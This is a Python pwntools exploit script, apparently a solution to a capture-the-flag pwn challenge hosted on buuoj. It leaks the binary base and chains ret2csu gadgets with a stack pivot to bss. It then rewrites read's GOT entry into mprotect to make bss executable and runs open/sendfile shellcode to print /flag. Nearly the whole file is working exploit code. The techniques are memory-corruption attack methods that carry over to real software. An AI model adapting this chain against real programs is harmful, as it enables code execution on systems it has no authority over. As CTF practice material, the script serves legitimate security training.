# template-v2.0 for exploit scripts by fa1c4
# usage: python exp.py [REMOTE|GDB|NULL]
'''
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    seccomp: execve, open
    vuln: arbitrary length buffer overflow in sub_1468
exp: attack mprotect and ret2shellcode
1.leak sub_1249 addr to calculate bin_base
2.magic_gadget 0x1232 to complete ret2csu chain and stack migrating to bss
3.attack mprotect to make the bss executable
4.read in shellcode to the bss 
5.ret2shellcode to ORW flag
'''
from pwn import *


# define the context
binary_name = './challenge'
libc_name = './libc-2.31.so' if args.REMOTE \
        else '/home/fa1c4/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so'
elf = ELF(binary_name, checksec=True) if binary_name else None
libc = ELF(libc_name, checksec=False) if libc_name else None
context.binary = elf
context(arch=elf.arch, os=elf.os)
context.terminal = ['tmux', 'splitw', '-h']

# define the io functions
rc  = lambda *x, **y: io.recv(*x, **y)
rl  = lambda *x, **y: io.recvline(*x, **y)
ru  = lambda *x, **y: io.recvuntil(*x, **y)
sn  = lambda *x, **y: io.send(*x, **y)
sl  = lambda *x, **y: io.sendline(*x, **y)
sa  = lambda *x, **y: io.sendafter(*x, **y)
sla = lambda *x, **y: io.sendlineafter(*x, **y)

# define the io object
if args.REMOTE:
    io = remote('node5.buuoj.cn', 26465)
elif args.GDB:
    context.log_level = 'debug'
    io = gdb.debug(binary_name, gdbscript="""
        # brva 0x0000000000001620
        brva 0x0000000000001468
        c
    """, aslr=False)
else:
    io = process(binary_name)


# exploiting code
sla(b': ', b'1')
sla(b': ', b'1')

ru(b'0x')
bin_base = int(rc(12), 16) - 0x1249
elf.address = bin_base
info(f'bin_base: {hex(bin_base)}')

ret2csu_gadget_front = bin_base + 0x0000000000001620
ret2csu_gadget_back = bin_base + 0x000000000000163A
# add_rbp_0x3D_ebx_gadget = bin_base + 0x0000000000001230
# add [rbp-3Dh], ebx; nop dword ptr [rax]; retn
magic_gadget = bin_base + 0x0000000000001232
pop_rdi_ret_gadget = bin_base + 0x0000000000001643
pop_rsi_r15_ret_gadget = bin_base + 0x0000000000001641
ret_gadget = bin_base + 0x000000000000101a
leave_ret_addr = bin_base + 0x000000000000141e
read_got_addr = elf.got['read']
read_plt_addr = elf.plt['read']

# rdx<-r14, rsi<-r13, edi<-r12d, call [r15+rbx*8]
def ret2csu(r12, r13, r14, r15):
    ret2csu_payload = p64(ret2csu_gadget_back)
    ret2csu_payload += p64(0) + p64(0x1) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    ret2csu_payload += p64(ret2csu_gadget_front)
    return ret2csu_payload
    
# addval should be positive integer
def add_rbp_3D_ebx(addval, target_addr):
    return flat([ret2csu_gadget_back,
                addval, target_addr + 0x3D, 
                0, 0, 0, 0,
                magic_gadget])
                

sl(b'2') # trigger the vuln
sleep(0.1)

# read(0, elf.bss(0x300), 0x100)
payload = cyclic(0x38) + ret2csu(0, elf.bss(0x300), 0x100, read_got_addr)
# ret2csu_gadget_front -> ret2csu_gadget_back within add rsp, 8
payload += p64(0xfa1c4233) + p64(elf.bss(0x300 - 8)) * 6 + p64(leave_ret_addr) # stack migration
sl(payload)
pause()

# hijack read to mprotect
mprotect_from_read = libc.sym['mprotect'] - libc.sym['read']
payload = add_rbp_3D_ebx(mprotect_from_read, read_got_addr)

# mprotect(elf.bss(), 0x1000, 7) & mprotect must align with page size 0x1000
payload += ret2csu(elf.bss() - 0x80, 0x1000, 7, elf.bss(0x300 + 0x80)) # 0x80 == len(add_rbp_3D_ebx) + len(ret2csu)
# print(hex(len(payload)))
payload += p64(pop_rdi_ret_gadget) + p64(elf.bss() - 0x80) + p64(read_plt_addr) # align with 0x1000
payload += p64(elf.bss(0x300 + 0xA0))
# print(hex(len(payload))) # 0xA0

# ORW
payload += asm(shellcraft.openat(-1, '/flag')) # openat must be absolute path
payload += asm(shellcraft.sendfile(2, 'rax', 0, 0x50))

sl(payload)

# interact with the shell
io.interactive()
